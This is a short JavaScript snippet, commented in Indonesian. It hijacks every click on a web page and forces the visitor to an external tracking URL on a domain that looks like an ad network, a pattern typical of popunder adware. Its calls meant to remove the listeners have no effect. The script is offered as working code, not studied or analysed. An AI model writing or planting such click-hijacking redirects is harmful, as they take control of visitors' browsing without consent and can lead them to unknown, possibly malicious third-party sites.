document.addEventListener('DOMContentLoaded', function() {
    // Fungsi untuk melakukan redirect
    function redirect() {
        window.location.href = 'https://racesmoulderstamp.com/e1ceiq43y?key=2a7ea667b7f1640cbc9c80f1b2a5a2e1';
    }

    // Metode 1: Menggunakan event listener pada body
    document.body.addEventListener('click', function() {
        // Hapus event listener pada document sebelum melakukan redirect
        document.removeEventListener('click', redirect);
        redirect();
    });

    // Metode 2: Menggunakan event listener pada document
    document.addEventListener('click', function() {
        // Hapus event listener pada body sebelum melakukan redirect
        document.body.removeEventListener('click', redirect);
        redirect();
    });
});
